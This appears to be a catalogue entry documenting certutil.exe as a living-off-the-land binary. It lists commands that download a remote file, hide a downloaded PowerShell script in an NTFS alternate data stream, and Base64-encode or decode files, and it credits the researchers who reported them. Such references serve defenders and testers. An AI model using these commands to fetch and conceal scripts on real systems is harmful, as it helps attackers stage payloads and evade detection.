## Certutil.exe
* Functions: Download, Add ADS, Decode, Encode
```

certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
Download and save 7zip to disk in the current folder.

certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
Download and save a PS1 file to an Alternate Data Stream (ADS).

certutil -encode inputFileName encodedOutputFileName
certutil -decode encodedInputFileName decodedOutputFileName

Commands to encode and decode a file using Base64.
```
   
* Resources:   
  * https://twitter.com/Moriarty_Meng/status/984380793383370752
  * https://twitter.com/mattifestation/status/620107926288515072
   
* Full path:   
  * c:\windows\system32\certutil.exe
  * c:\windows\sysWOW64\certutil.exe
   
* Notes: Thanks to Matt Graeber - @mattifestation, Moriarty - @Moriarty2016  
   
